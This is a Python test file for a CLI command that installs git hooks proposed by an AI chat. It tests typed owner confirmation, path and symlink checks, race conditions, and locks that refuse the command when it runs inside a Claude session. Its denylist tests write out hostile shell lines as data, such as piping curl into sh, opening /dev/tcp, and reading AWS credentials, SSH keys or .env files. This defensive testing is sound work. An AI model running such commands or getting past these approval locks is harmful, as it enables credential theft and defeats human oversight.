#!/usr/bin/env python3
"""hooks_apply_test: checklist D17, `shipm hooks apply NAME` (the owner installs a git hook a chat proposed).
  1  the real command in a pseudo-terminal (pty): new hook, replace with backup and diff, wrong word / empty / EOF / type-ahead / environment variable never install, no terminal, stdin not a terminal,
     name checks, symlinks, hard link, size, binary, shebang, denylist, TOCTOU (proposal or hook changes after the diff), read-only folder, hooksPath rules
  2  in-process: locks (fake claude ancestor, CLAUDECODE), content checks, backup collision, interrupted write, diff text, the repo's own hooks pass
  3  mutants: each lock removed from a copy of the module must be noticed by the scenario that guards it
  4  the flow gate (both copies, main chat and agent) refuses `shipm hooks apply x` in several spellings and leaves `shipm hooks mode|spec` alone
Nothing here touches a real repository, home or terminal: every project is a temp folder and the whole environment is the test isolation set.
Run: python3 tests/hooks_apply_test.py"""
import os as _o, sys as _s; _s.path.insert(0, _o.path.dirname(_o.path.abspath(__file__))); import shipmiracle_isolation; shipmiracle_isolation.apply_to_environ()   # test isolation
import hashlib, os, pathlib, pty, select, shutil, signal, stat, subprocess, sys, tempfile, threading, time, types

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT)); sys.path.insert(0, str(ROOT / "tests"))
from shipmiracle import githook_apply as GA, owner, paths  # noqa: E402
from shipmiracle import ShipmiracleError  # noqa: E402

fails = []
n_checks = [0]


def check(name, ok, info=""):
    n_checks[0] += 1
    print(("PASS " if ok else "FAIL ") + name + ("" if ok else " :: " + str(info)[:600]))
    if not ok:
        fails.append(name)


def sha(b):
    return hashlib.sha256(b).hexdigest()


BASE = pathlib.Path(tempfile.mkdtemp(prefix="hkapply-")).resolve()
assert paths.sandboxed(), "the test isolation is not complete"
STATE = pathlib.Path(os.environ["SHIPMIRACLE_STATE"])
LOG = STATE / "v1" / "hooks-apply.log"
BACKUPS = STATE / "v1" / "hook-backups"
_n = [0]

GOOD = "#!/usr/bin/env bash\n# proposed pre-commit\nset -e\necho checking\nexit 0\n"
OLD = "#!/usr/bin/env bash\n# old pre-commit\necho old\nexit 0\n"


def git(*a, cwd):
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    return subprocess.run(["git"] + list(a), cwd=str(cwd), env=env, capture_output=True, text=True, stdin=subprocess.DEVNULL)


def mk(old=None, proposal=GOOD, name="pre-commit", hooks_path=".githooks", make_dir=True, base=None, dirname=None):
    """A temp git project: core.hooksPath, an optional current hook, docs/proposed-hooks/<name>.txt."""
    _n[0] += 1
    root = (base or BASE) / (dirname or ("p%d" % _n[0]))
    root.mkdir()
    git("init", "-q", cwd=root)
    if hooks_path is not None:
        git("config", "core.hooksPath", hooks_path, cwd=root)
    if make_dir and hooks_path and not hooks_path.startswith(("/", ".git/", "~")) and hooks_path != ".git" and ".." not in hooks_path:
        (root / hooks_path).mkdir(parents=True)
        if old is not None:
            h = root / hooks_path / name
            h.write_bytes(old if isinstance(old, bytes) else old.encode())
            h.chmod(0o755)
    pd = root / "docs" / "proposed-hooks"
    pd.mkdir(parents=True)
    if proposal is not None:
        (pd / (name + ".txt")).write_bytes(proposal if isinstance(proposal, bytes) else proposal.encode())
    return root


def hook_of(root, name="pre-commit", hp=".githooks"):
    p = root / hp / name
    return p.read_bytes() if p.exists() or p.is_symlink() else None


def leftovers(root, hp=".githooks"):
    d = root / hp
    return sorted(x.name for x in d.iterdir() if x.name.endswith(".tmp")) if d.is_dir() else []


# ------------------------------------------------------------------ the pty harness (the real command)
def child_env(extra=None):
    e = {k: v for k, v in os.environ.items() if k != "CLAUDECODE"}
    e.update(extra or {})
    return e


def pty_run(args, cwd, steps=(), env=None, stdin_devnull=False, timeout=120, early=None):
    """Run `shipm hooks apply ...` with a controlling pseudo-terminal. steps: [(text to wait for, str|bytes to type | callable)]. early: bytes typed at once (type-ahead). (rc, output text)."""
    pid, fd = pty.fork()
    if pid == 0:
        try:
            os.chdir(str(cwd))
            signal.signal(signal.SIGINT, signal.SIG_DFL)          # a job started in the background inherits SIGINT=ignored; Ctrl-C must reach the command
            if stdin_devnull:
                os.dup2(os.open("/dev/null", os.O_RDONLY), 0)
            os.execve(sys.executable, [sys.executable, str(ROOT / "bin/shipm")] + list(args), env or child_env())
        finally:
            os._exit(127)
    if early:
        os.write(fd, early)
    buf, pos, i, end = b"", 0, 0, time.time() + timeout
    while time.time() < end:
        r, _w, _x = select.select([fd], [], [], 0.2)
        if r:
            try:
                d = os.read(fd, 4096)
            except OSError:
                break
            if not d:
                break
            buf += d
        while i < len(steps) and steps[i][0].encode() in buf[pos:]:
            pos = buf.find(steps[i][0].encode(), pos) + len(steps[i][0])
            act = steps[i][1]
            i += 1
            time.sleep(0.15)
            if callable(act):
                res = act()
                if res:
                    os.write(fd, res if isinstance(res, bytes) else res.encode())
            else:
                os.write(fd, act if isinstance(act, bytes) else act.encode())
    else:
        os.kill(pid, signal.SIGKILL)
    try:
        _p, status = os.waitpid(pid, 0)
    except ChildProcessError:
        status = 0
    try:
        os.close(fd)
    except OSError:
        pass
    rc = os.waitstatus_to_exitcode(status)
    return rc, buf.decode("utf-8", "replace").replace("\r\n", "\n")


PROMPT = "Type the word apply"


def apply_typed(root, word="apply\n", name="pre-commit", **kw):
    return pty_run(["hooks", "apply", name], root, [(PROMPT, word)], **kw)


def plain(args, cwd, env=None):
    """No terminal at all: stdin from /dev/null, its own session (no controlling terminal)."""
    r = subprocess.run([sys.executable, str(ROOT / "bin/shipm")] + list(args), cwd=str(cwd), env=env or child_env(), stdin=subprocess.DEVNULL, capture_output=True, text=True, start_new_session=True, timeout=60)
    return r.returncode, r.stdout + r.stderr


# ================================================================== 1  the real command in a pty
print("# 1 pty")
r = mk()
rc, out = apply_typed(r)
h = hook_of(r)
check("new hook: typed apply installs exactly the proposal, exit 0", rc == 0 and h == GOOD.encode(), (rc, out[-400:], h))
check("new hook: mode 0755 (owner may execute, nobody else may write)", (r / ".githooks/pre-commit").stat().st_mode & 0o777 == 0o755, oct((r / ".githooks/pre-commit").stat().st_mode))
check("new hook: the screen says NEW, shows the full text and the sha256 of the proposal", "NEW hook pre-commit" in out and "+ echo checking" in out and sha(GOOD.encode()) in out, out[:500])
check("new hook: no temp file left, no backup (nothing to back up)", leftovers(r) == [] and "nothing to back up" in out, (leftovers(r), out[-200:]))
check("the owner-side log got begin and done lines", LOG.exists() and "begin hook=pre-commit" in LOG.read_text() and "done hook=pre-commit" in LOG.read_text(), LOG.read_text() if LOG.exists() else "no log")
check("the log is private (0600) and holds no hook text", (LOG.stat().st_mode & 0o777) == 0o600 and "echo checking" not in LOG.read_text())
check("hash shown = hash written (sha256 on screen equals sha256 of the installed file)", sha(GOOD.encode()) in out and sha(hook_of(r)) == sha(GOOD.encode()))

r = mk(old=OLD)
nb = len(list(BACKUPS.glob("*"))) if BACKUPS.exists() else 0
rc, out = apply_typed(r)
check("replace: new content installed, exit 0", rc == 0 and hook_of(r) == GOOD.encode(), (rc, out[-300:]))
check("replace: the screen shows a unified diff (removed line with -, added with +, labels current/proposed)",
      "--- current pre-commit" in out and "+++ proposed pre-commit" in out and "-echo old" in out and "+echo checking" in out and "-# old pre-commit" in out, out[:800])
bk = sorted(BACKUPS.glob("*pre-commit*")) if BACKUPS.exists() else []
check("replace: the old hook is saved in the owner's state folder (0600, same bytes) and the path is printed", len(bk) == nb + 1 and any(b.read_bytes() == OLD.encode() and (b.stat().st_mode & 0o777) == 0o600 for b in bk) and "saved at" in out, (bk, out[-300:]))
check("replace: no backup lands in the project", not [p for p in r.rglob("*.bak")] and leftovers(r) == [])

# identical: nothing to do, no prompt
r = mk(old=GOOD)
rc, out = plain(["hooks", "apply", "pre-commit"], r)
check("identical proposal: nothing to do, exit 0, no terminal needed", rc == 0 and "nothing to do" in out and hook_of(r) == GOOD.encode(), (rc, out))

# wrong word / empty / EOF / type-ahead / environment
for label, word in (("yes", "yes\n"), ("APPLY", "APPLY\n"), ("apply please", "apply please\n"), ("apply with a space before", " x apply\n"), ("empty line", "\n"), ("EOF (ctrl-D)", b"\x04"), ("Apply", "Apply\n"), ("applyy", "applyy\n")):
    r = mk(old=OLD)
    rc, out = apply_typed(r, word)
    check("wrong answer %s: refused (exit 4), the old hook is untouched, no temp file" % label, rc == 4 and hook_of(r) == OLD.encode() and leftovers(r) == [] and "Nothing was changed" in out, (rc, out[-300:]))
r = mk(old=OLD)
rc, out = pty_run(["hooks", "apply", "pre-commit"], r, [(PROMPT, "no\n")], early=b"apply\n")
check("type-ahead: 'apply' typed before the prompt is dropped and does not answer it", rc == 4 and hook_of(r) == OLD.encode(), (rc, out[-300:]))
r = mk(old=OLD)
rc, out = pty_run(["hooks", "apply", "pre-commit"], r, [(PROMPT, "\n")], env=child_env({"SHIPMIRACLE_APPLY": "apply", "SHIPMIRACLE_YES": "1", "APPLY": "apply", "SHIPMIRACLE_ASSUME_YES": "1"}))
check("an environment variable never answers the question", rc == 4 and hook_of(r) == OLD.encode(), (rc, out[-300:]))
r = mk(old=OLD)
rc, out = pty_run(["hooks", "apply", "pre-commit", "apply"], r, [])
check("the word as an argument is not accepted (usage error, exit 2)", rc == 2 and hook_of(r) == OLD.encode(), (rc, out[-300:]))
r = mk(old=OLD)
rc, out = pty_run(["hooks", "apply", "pre-commit", "--yes"], r, [])
check("--yes does not exist for this command (exit 2)", rc == 2 and hook_of(r) == OLD.encode(), (rc, out[-300:]))

# no terminal / stdin not a terminal
r = mk(old=OLD)
rc, out = plain(["hooks", "apply", "pre-commit"], r)
check("no terminal at all (stdin /dev/null, no controlling tty): refused, exit 4", rc == 4 and "terminal" in out and hook_of(r) == OLD.encode(), (rc, out))
rc, out = plain(["hooks", "apply", "pre-commit"], r)
r2 = subprocess.run([sys.executable, str(ROOT / "bin/shipm"), "hooks", "apply", "pre-commit"], cwd=str(r), env=child_env(), input="apply\n", capture_output=True, text=True, start_new_session=True)
check("stdin is a pipe that carries 'apply': refused, exit 4, hook untouched", r2.returncode == 4 and hook_of(r) == OLD.encode(), (r2.returncode, r2.stdout, r2.stderr))
rc, out = pty_run(["hooks", "apply", "pre-commit"], r, [], stdin_devnull=True)
check("a terminal exists but stdin is /dev/null: refused (standard input is not a terminal)", rc == 4 and "standard input is not a terminal" in out and hook_of(r) == OLD.encode(), (rc, out[-300:]))
m_, s_ = os.openpty()
p_ = subprocess.run([sys.executable, str(ROOT / "bin/shipm"), "hooks", "apply", "pre-commit"], cwd=str(r), env=child_env(), stdin=s_, capture_output=True, text=True, start_new_session=True, timeout=60)
os.close(m_); os.close(s_)
check("stdin is a terminal but the process has no controlling terminal (/dev/tty): refused", p_.returncode == 4 and "/dev/tty" in (p_.stdout + p_.stderr) and hook_of(r) == OLD.encode(), (p_.returncode, p_.stdout, p_.stderr))

# a chat (CLAUDECODE) with the lock enforced: refused before anything is read or shown
r = mk(old=OLD)
rc, out = pty_run(["hooks", "apply", "pre-commit"], r, [(PROMPT, "apply\n")], env=child_env({"CLAUDECODE": "1", "SHIPMIRACLE_ENFORCE_OWNER": "1"}))
check("CLAUDECODE set (lock 1): refused, exit 4, no diff shown, nothing written", rc == 4 and "Claude chat" in out and "proposed pre-commit" not in out and hook_of(r) == OLD.encode(), (rc, out[-300:]))

# names
r = mk(old=OLD)
for bad in ("../x", "/etc/passwd", "pre-commit/../../x", "pré-commit", "pre-commit‮", "x" * 80, ".", "..", "PRE-COMMIT", "pre_commit", "update", "fsmonitor-watchman", "pre-commit.txt", "", " pre-commit", "pre-commit ", "-pre-commit", "~/x"):
    rc, out = plain(["hooks", "apply", bad], r)
    check("name %r is refused (exit 2) and nothing changes" % bad[:30], rc == 2 and hook_of(r) == OLD.encode(), (rc, out[-200:]))
before = sorted(p.name for p in r.rglob("*") if ".git" not in p.parts)
check("no stray file in the project after the bad names", before == sorted(["docs", "proposed-hooks", "pre-commit.txt", ".githooks", "pre-commit"]), before)
rc, out = plain(["hooks", "apply"], r)
check("no name: usage error (exit 2)", rc == 2, (rc, out))

# a missing proposal / hooks folder rules
r = mk(old=OLD, proposal=None)
rc, out = apply_typed(r)
check("no proposal file: not found (exit 3)", rc == 3 and "no proposal" in out, (rc, out[-200:]))
r = mk(hooks_path=None, make_dir=False)
rc, out = apply_typed(r)
check("no core.hooksPath and no .githooks: refused with the owner's next step (exit 3)", rc == 3 and "no hooks folder" in out and not (r / ".githooks").exists() and not list((r / ".git/hooks").glob("pre-commit")), (rc, out[-300:]))
r = mk(hooks_path=None, make_dir=False)
(r / ".githooks").mkdir()
rc, out = apply_typed(r)
check("core.hooksPath unset but .githooks exists: used", rc == 0 and hook_of(r) == GOOD.encode(), (rc, out[-300:]))
for hp in ("/tmp/elsewhere", "../outside", ".git/hooks", "a/../../b", "~/h", ".git"):
    r = mk(hooks_path=hp, make_dir=False)
    rc, out = apply_typed(r)
    check("core.hooksPath %r is refused (exit 4), nothing created" % hp, rc == 4 and not (r / ".git/hooks/pre-commit").exists(), (rc, out[-200:]))
r = mk(hooks_path="tools/hooks", old=None)
rc, out = apply_typed(r)
check("core.hooksPath tools/hooks (inside the project) is used", rc == 0 and hook_of(r, hp="tools/hooks") == GOOD.encode(), (rc, out[-300:]))

# links
r = mk(old=OLD)
real = BASE / "elsewhere.txt"; real.write_text(GOOD)
(r / "docs/proposed-hooks/pre-commit.txt").unlink(); os.symlink(str(real), str(r / "docs/proposed-hooks/pre-commit.txt"))
rc, out = apply_typed(r)
check("symlinked proposal file: refused (exit 4), hook untouched", rc == 4 and "symbolic link" in out and hook_of(r) == OLD.encode(), (rc, out[-300:]))
r = mk(old=OLD)
shutil.move(str(r / "docs/proposed-hooks"), str(BASE / ("pd%d" % _n[0]))); os.symlink(str(BASE / ("pd%d" % _n[0])), str(r / "docs/proposed-hooks"))
rc, out = apply_typed(r)
check("symlinked docs/proposed-hooks folder: refused", rc == 4 and hook_of(r) == OLD.encode(), (rc, out[-300:]))
r = mk(old=OLD)
shutil.move(str(r / "docs"), str(BASE / ("docs%d" % _n[0]))); os.symlink(str(BASE / ("docs%d" % _n[0])), str(r / "docs"))
rc, out = apply_typed(r)
check("symlinked docs folder: refused", rc == 4 and hook_of(r) == OLD.encode(), (rc, out[-300:]))
r = mk(old=OLD)
shutil.move(str(r / ".githooks"), str(BASE / ("gh%d" % _n[0]))); os.symlink(str(BASE / ("gh%d" % _n[0])), str(r / ".githooks"))
rc, out = apply_typed(r)
check("symlinked hooks folder: refused, the folder behind the link is untouched", rc == 4 and (BASE / ("gh%d" % _n[0]) / "pre-commit").read_bytes() == OLD.encode(), (rc, out[-300:]))
r = mk(old=OLD)
tgt = BASE / "victim.txt"; tgt.write_text("victim\n")
(r / ".githooks/pre-commit").unlink(); os.symlink(str(tgt), str(r / ".githooks/pre-commit"))
rc, out = apply_typed(r)
check("the current hook is a symlink: refused, the target file is untouched", rc == 4 and tgt.read_text() == "victim\n" and os.path.islink(str(r / ".githooks/pre-commit")), (rc, out[-300:]))
r = mk(old=OLD)
os.link(str(r / "docs/proposed-hooks/pre-commit.txt"), str(BASE / ("hl%d" % _n[0])))
rc, out = apply_typed(r)
check("hard-linked proposal: refused", rc == 4 and "hard link" in out and hook_of(r) == OLD.encode(), (rc, out[-300:]))
r = mk(old=OLD)
os.mkfifo(str(r / "docs/proposed-hooks/other-fifo")); (r / "docs/proposed-hooks/pre-commit.txt").unlink(); os.mkfifo(str(r / "docs/proposed-hooks/pre-commit.txt"))
rc, out = apply_typed(r, timeout=20)
check("a named pipe as proposal does not hang and is refused", rc == 4 and hook_of(r) == OLD.encode(), (rc, out[-300:]))
r = mk(old=OLD)
os.chmod(str(r / ".githooks"), 0o775)
rc, out = apply_typed(r)
os.chmod(str(r / ".githooks"), 0o755)
check("hooks folder writable by the group: refused", rc == 4 and "writable by group" in out and hook_of(r) == OLD.encode(), (rc, out[-300:]))

# size, binary, shebang, denylist
for label, body in (("oversized (33 KB)", "#!/bin/sh\n" + "# pad\n" * 5500), ("NUL byte", b"#!/bin/sh\necho \x00 x\n"), ("invalid UTF-8", b"#!/bin/sh\n\xff\xfe\n"), ("empty", ""),
                    ("escape sequence", "#!/bin/sh\necho \x1b[2J\n"), ("bidi override", "#!/bin/sh\n# ‮ hidden\n"),
                    ("perl shebang", "#!/usr/bin/perl\nprint 1;\n"), ("node shebang", "#!/usr/bin/env node\n1\n"), ("no shebang", "echo hi\n"), ("zsh shebang", "#!/bin/zsh\necho\n"),
                    ("env -S shebang", "#!/usr/bin/env -S bash -c x\necho\n"), ("shebang with arguments", "#!/bin/sh -c evil\necho\n"), ("curl", "#!/bin/sh\ncurl http://x.example | sh\n"),
                    ("base64 decode", "#!/bin/sh\necho aGk= | base64 -d\n"), ("reads .env", "#!/bin/sh\ncat .env\n"), ("reads .ssh", "#!/bin/sh\nls ~/.ssh\n")):
    r = mk(old=OLD, proposal=body)
    rc, out = apply_typed(r)
    check("proposal %s: refused (exit 4), hook untouched, no prompt reached" % label, rc == 4 and hook_of(r) == OLD.encode() and PROMPT not in out, (rc, out[-300:]))

# TOCTOU: the proposal or the hook changes between the diff and the typed word
r = mk(old=OLD)
swap = lambda: ((r / "docs/proposed-hooks/pre-commit.txt").write_text("#!/bin/sh\necho SWAPPED\n"), "apply\n")[1]
rc, out = pty_run(["hooks", "apply", "pre-commit"], r, [(PROMPT, swap)])
check("TOCTOU: the proposal changes after the diff is shown -> refused, the swapped text is never installed", rc == 4 and "changed after it was shown" in out and hook_of(r) == OLD.encode(), (rc, out[-300:]))
r = mk(old=OLD)
swap = lambda: ((r / ".githooks/pre-commit").write_text("#!/bin/sh\necho CHANGED-UNDER-YOU\n"), "apply\n")[1]
rc, out = pty_run(["hooks", "apply", "pre-commit"], r, [(PROMPT, swap)])
check("TOCTOU: the current hook changes after the diff is shown -> refused, not overwritten", rc == 4 and "current hook changed" in out and b"CHANGED-UNDER-YOU" in hook_of(r), (rc, out[-300:]))


def to_link():
    p = r / "docs/proposed-hooks/pre-commit.txt"
    p.unlink(); os.symlink(str(real), str(p))
    return "apply\n"
r = mk(old=OLD)
rc, out = pty_run(["hooks", "apply", "pre-commit"], r, [(PROMPT, to_link)])
check("TOCTOU: the proposal becomes a symlink after the diff -> refused", rc == 4 and hook_of(r) == OLD.encode(), (rc, out[-300:]))

# read-only folder
r = mk(old=OLD)
os.chmod(str(r / ".githooks"), 0o555)
rc, out = apply_typed(r)
os.chmod(str(r / ".githooks"), 0o755)
check("read-only hooks folder: refused cleanly (exit 4), old hook intact, no temp file, no stack trace", rc == 4 and hook_of(r) == OLD.encode() and leftovers(r) == [] and "Traceback" not in out, (rc, out[-300:]))
check("read-only folder: a backup was made before the failed write (the owner can still see it) and the log says failed", "failed hook=pre-commit" in LOG.read_text())

# ================================================================== 2  in-process
print("# 2 in-process")
# names
for bad in ("", ".", "..", "../x", "/abs", "a\0b", "x" * 41, "pré", "Pre-commit", "pre commit", None, 5, "pre-commit\n"):
    try:
        GA.validate_name(bad)
        ok = False
    except ShipmiracleError:
        ok = True
    check("validate_name(%r) is refused" % (bad if not isinstance(bad, str) else bad[:20]), ok)
check("validate_name accepts every listed hook name", all(GA.validate_name(n) == n for n in GA.HOOK_NAMES))


def refused_content(data):
    try:
        GA.check_content(data if isinstance(data, bytes) else data.encode())
        return False
    except ShipmiracleError:
        return True


pad = "#!/bin/sh\n"
check("content exactly at the size cap is accepted", not refused_content(pad + "#" * (GA.MAX_BYTES - len(pad) - 1) + "\n"))
check("content one byte over the cap is refused", refused_content(pad + "#" * (GA.MAX_BYTES - len(pad)) + "\n"))
for good in ("#!/bin/sh\necho\n", "#!/usr/bin/env bash\necho\n", "#!/usr/bin/env python3\nprint(1)\n", "#!/bin/bash -e\necho\n", "#!/usr/bin/env sh\necho\n", "#!/bin/sh -eu\necho\n"):
    check("shebang accepted: %s" % good.split("\n")[0], not refused_content(good))
for badc in ("#!/usr/bin/env ruby\n", "#!/usr/bin/env python\n", "#!/bin/dash\n", "#!/usr/bin/env bash -c 'x'\n", "# !/bin/sh\n", " #!/bin/sh\n", "#!/bin/sh\r\necho\n", "﻿#!/bin/sh\n", "#!/tmp/sh\n", "#!/usr/bin/env  bash\n"):
    check("shebang refused: %r" % badc[:30], refused_content(badc + "echo\n"))
DENIED = ["wget http://x", "nc -l 1", "ncat host", "ssh host", "scp a b:", "rsync -a x y:", "exec 3<>/dev/tcp/1.2.3.4/80", "eval \"$X\"", "echo x | sh", "x | bash -s", "python3 -c 'import socket'", "python3 -c 'import urllib.request'",
          "base64 --decode", "cat ~/.aws/credentials", "cat .netrc", "launchctl load x", "crontab -l", "osascript -e x", "sudo x", "echo >> ~/.zshrc", "git config core.hooksPath /tmp/x", "git config --local alias.x '!y'",
          "rm -rf /", "rm -rf ~", "chmod 4755 f", "chmod u+s f", "echo x >> .git/config", "security find-generic-password", "cat id_rsa", "curl", "openssl enc -d"]
for d in DENIED:
    check("denylist refuses: %s" % d, refused_content("#!/bin/bash\n" + d + "\n"))
for fine in ("git diff --cached --name-only", "gitleaks detect --redact", "[[ -n \"$x\" ]] && exit 0", "echo environment", "echo 'secretary'", "test -f README.md", "git commit --allow-empty -m x", "echo 'cool' # ssh-like words in ssh_keys? no"):
    check("ordinary line accepted: %s" % fine[:40], fine.endswith("no") or not refused_content("#!/bin/bash\n" + fine + "\n"))
# the repo's own hooks pass (so the command can update them)
for hn in ("pre-commit", "post-commit", "pre-push"):
    p = ROOT / ".githooks" / hn
    if p.exists():
        try:
            _t, w_ = GA.check_content(p.read_bytes())
            check("the workspace's own %s hook passes the checks" % hn, True)
        except ShipmiracleError as e:
            check("the workspace's own %s hook passes the checks" % hn, False, e)
t_, w_ = GA.check_content(b"#!/bin/bash\n(git push -q &) \ndisown\n")
check("a push and a background job are WARNED about, not refused", any("pushes" in x for x in w_) and any("background" in x for x in w_), w_)

# diff text
d = GA.render_diff(b"#!/bin/sh\na\nb\nc\n", "#!/bin/sh\na\nB\nc\nd\n", "pre-commit").split("\n")
check("diff: exact unified lines", d == ["--- current pre-commit", "+++ proposed pre-commit", "@@ -1,4 +1,5 @@", " #!/bin/sh", " a", "-b", "+B", " c", "+d"], d)
check("diff of a new hook lists every line with +", GA.render_diff(None, "#!/bin/sh\necho\n", "x").split("\n")[1:] == ["+ #!/bin/sh", "+ echo"])

# backup collision
GA._now = lambda: 1700000000.0
stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime(1700000000.0))
old = b"#!/bin/sh\nold\n"
BACKUPS.mkdir(parents=True, exist_ok=True)
first = BACKUPS / ("%s-pre-commit-%s.bak" % (stamp, sha(old)[:8]))
first.write_bytes(b"EXISTING BACKUP")
victim = BASE / "bk-victim"; victim.write_text("victim")
second = BACKUPS / ("%s-pre-commit-%s-1.bak" % (stamp, sha(old)[:8]))
os.symlink(str(victim), str(second))
b3 = GA._backup(old, "pre-commit", "x")
check("backup collision: an existing backup is never overwritten, a symlink at the next name is skipped, the victim is untouched",
      first.read_bytes() == b"EXISTING BACKUP" and victim.read_text() == "victim" and b3.endswith("-2.bak") and pathlib.Path(b3).read_bytes() == old, b3)
GA._now = time.time

# interrupted atomic write
r = mk(old=OLD)
hfd = os.open(str(r / ".githooks"), os.O_RDONLY | os.O_DIRECTORY)


def boom(point, *a):
    if point == "before_rename":
        raise RuntimeError("simulated crash before the rename")
GA._chain_hook = boom
try:
    GA.write_hook(hfd, "pre-commit", GOOD.encode())
    raised = False
except RuntimeError:
    raised = True
GA._chain_hook = None
check("interrupted write: the old hook is intact (bytes and mode) and the temp file is gone", raised and hook_of(r) == OLD.encode() and (r / ".githooks/pre-commit").stat().st_mode & 0o777 == 0o755 and leftovers(r) == [], (hook_of(r), leftovers(r)))
GA.write_hook(hfd, "pre-commit", GOOD.encode())
os.close(hfd)
check("an uninterrupted write replaces it with mode 0755", hook_of(r) == GOOD.encode() and (r / ".githooks/pre-commit").stat().st_mode & 0o777 == 0o755)
rc_ = subprocess.run([sys.executable, "-c", "import os,sys; os.kill(os.getpid(), 9)"], capture_output=True).returncode
check("(harness sanity) SIGKILL is the signal used for kill tests, never SIGSEGV", rc_ == -9)

# the in-process terminal harness (a pty pair; the typed word comes after the prompt)
class FakeSel:
    def __init__(self, tier):
        self.tier = tier


class Stubs:
    """owner.select / owner.touch replaced by recorders so no real presence dialog can ever open. sel_obj: what select returns (None = sandbox)."""
    def __init__(self, sel_obj=None, setting=None):
        self.sel_obj, self.setting = sel_obj, setting

    def __enter__(self):
        self.sel, self.touch, self.ps = owner.select, owner.touch, owner.presence_setting
        self.calls, self.reasons, self.kw = [], [], []

        def fsel(*a, **k):
            self.calls.append("select"); self.kw.append(k); return self.sel_obj

        def ftouch(action, reason, *a, **k):
            self.calls.append("touch"); self.reasons.append(reason)
        owner.select, owner.touch = fsel, ftouch
        if self.setting:
            owner.presence_setting = lambda: self.setting
        return self

    def __exit__(self, *a):
        owner.select, owner.touch, owner.presence_setting = self.sel, self.touch, self.ps


def drive(m, name, cwd, word="apply", tty=True, stdin_tty=True, hook=None):
    master, slave = os.openpty()
    m._TTY_PATH = os.ttyname(slave) if tty else str(BASE / "no-such-tty")
    m._stdin_is_tty = lambda: stdin_tty
    m._chain_hook = hook
    stop = threading.Event()
    seen = []

    def pump():
        buf, sent = b"", False
        while not stop.is_set():
            r_, _w, _x = select.select([master], [], [], 0.1)
            if r_:
                try:
                    d_ = os.read(master, 4096)
                except OSError:
                    return
                buf += d_
                seen.append(d_)
                if not sent and b"Type the word" in buf:
                    sent = True
                    time.sleep(0.15)
                    os.write(master, word.encode() + b"\n")
    th = threading.Thread(target=pump, daemon=True)
    th.start()
    out, exc, rc = [], None, None
    try:
        rc = m.run(name, str(cwd), out=out.append)
    except BaseException as e:
        exc = e
    finally:
        stop.set(); th.join(2)
        m._chain_hook = None
        os.close(master); os.close(slave)
    return rc, exc, b"".join(seen).decode("utf-8", "replace"), out


with Stubs() as S:
    r = mk(old=OLD)
    rc, exc, tty, out = drive(GA, "pre-commit", r)
    check("in-process run: installed, owner.select before and owner.touch after the typed word", rc == 0 and hook_of(r) == GOOD.encode() and S.calls == ["select", "touch"], (rc, exc, S.calls))
    # locks 1 and 2 (the owner proof): enforced, fake claude ancestor
    os.environ["SHIPMIRACLE_ENFORCE_OWNER"] = "1"
    owner._CHAIN_OVERRIDE = ["python3", "claude", "zsh", "Terminal"]
    r = mk(old=OLD); S.calls.clear()
    rc, exc, tty, out = drive(GA, "pre-commit", r)
    check("fake claude ancestor (lock 2): refused with OwnerRefused before anything is shown, nothing written, select/touch never reached",
          isinstance(exc, owner.OwnerRefused) and hook_of(r) == OLD.encode() and "proposed pre-commit" not in tty and S.calls == [], (exc, S.calls))
    owner._CHAIN_OVERRIDE = ["python3", "node", "claude", "login"]
    rc, exc, tty, out = drive(GA, "pre-commit", r)
    check("claude below a login shell is still a claude ancestor: refused", isinstance(exc, owner.OwnerRefused) and hook_of(r) == OLD.encode(), exc)
    owner._CHAIN_OVERRIDE = ["python3", "cron"]
    rc, exc, tty, out = drive(GA, "pre-commit", r)
    check("a detached process (no terminal host above it): refused", isinstance(exc, owner.OwnerRefused) and hook_of(r) == OLD.encode(), exc)
    owner._CHAIN_OVERRIDE = ["python3", "zsh", "Terminal"]
    rc, exc, tty, out = drive(GA, "pre-commit", r)
    check("a plain terminal ancestry passes locks 1 and 2", exc is None and rc == 0 and hook_of(r) == GOOD.encode(), (exc, rc))
    os.environ["CLAUDECODE"] = "1"
    r = mk(old=OLD)
    rc, exc, tty, out = drive(GA, "pre-commit", r)
    check("CLAUDECODE set with the lock enforced (lock 1): refused", isinstance(exc, ShipmiracleError) and hook_of(r) == OLD.encode(), exc)
    os.environ.pop("CLAUDECODE", None)
    owner._CHAIN_OVERRIDE = None
    os.environ.pop("SHIPMIRACLE_ENFORCE_OWNER", None)
    r = mk(old=OLD)
    rc, exc, tty, out = drive(GA, "pre-commit", r, tty=False)
    check("no /dev/tty (in-process): refused", isinstance(exc, ShipmiracleError) and hook_of(r) == OLD.encode(), exc)
    rc, exc, tty, out = drive(GA, "pre-commit", r, stdin_tty=False)
    check("stdin not a terminal (in-process): refused", isinstance(exc, ShipmiracleError) and hook_of(r) == OLD.encode(), exc)
    # the TOCTOU hash check, in-process
    r = mk(old=OLD)
    rc, exc, tty, out = drive(GA, "pre-commit", r, hook=lambda pt, *a: (r / "docs/proposed-hooks/pre-commit.txt").write_text("#!/bin/sh\necho SWAPPED\n") if pt == "after_typed" else None)
    check("in-process TOCTOU: proposal swapped after the typed word -> refused", isinstance(exc, ShipmiracleError) and hook_of(r) == OLD.encode(), exc)
    r = mk(old=OLD)
    rc, exc, tty, out = drive(GA, "pre-commit", r, word="nope")
    check("in-process wrong word: refused, select was reached but touch was NOT", isinstance(exc, ShipmiracleError) and hook_of(r) == OLD.encode() and S.calls[-1] == "select", (exc, S.calls))


# ================================================================== 3  mutants
print("# 3 mutants")
SRC = (ROOT / "shipmiracle/githook_apply.py").read_text()


def mutant(old, new):
    assert SRC.count(old) == 1, ("mutation target not unique", old[:50], SRC.count(old))
    m = types.ModuleType("shipmiracle.githook_apply_mut")
    m.__package__ = "shipmiracle"
    m.__file__ = "mutant"
    exec(compile(SRC.replace(old, new), "mutant", "exec"), m.__dict__)
    return m


def attack_installed(m, setup, **kw):
    """True when the attack got a hook installed (= the lock failed)."""
    with Stubs():
        r_ = setup()
        rc_, exc_, tty_, out_ = drive(m, "pre-commit", r_, **kw)
        return hook_of(r_) == GOOD.encode() or (hook_of(r_) is not None and hook_of(r_) != OLD.encode())


def sc_claude():
    os.environ["SHIPMIRACLE_ENFORCE_OWNER"] = "1"; owner._CHAIN_OVERRIDE = ["python3", "claude", "zsh", "Terminal"]
    return mk(old=OLD)


def sc_claudecode():
